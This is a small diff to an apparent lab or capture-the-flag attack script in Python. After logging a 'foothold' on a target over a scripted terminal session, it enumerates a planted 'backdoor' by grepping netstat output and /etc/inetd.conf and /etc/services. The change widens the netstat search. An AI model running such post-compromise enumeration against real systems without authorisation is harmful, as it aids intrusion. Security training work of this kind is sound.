@@ -81,8 +81,8 @@ def main():
         log("foothold OK: logged in as %s"%FUSER)
 
         # enumerate: the backdoor port + the breadcrumb
-        tn.sendline(f"netstat -a 2>/dev/null | grep {BPORT}"); tn.expect(r"BRIAN> ",timeout=30)
-        log("netstat %s: %s"%(BPORT," ".join(tn.before.strip().split())[-100:]))
+        tn.sendline(f"netstat -a 2>/dev/null | grep -iE 'pmd|{BPORT}'"); tn.expect(r"BRIAN> ",timeout=30)
+        log("netstat backdoor: %s"%" ".join(tn.before.strip().split())[-110:])
         tn.sendline("grep -i pmd /etc/inetd.conf /etc/services 2>&1"); tn.expect(r"BRIAN> ",timeout=30)
         log("inetd wiring: %s"%" ".join(tn.before.strip().split())[-140:])
 
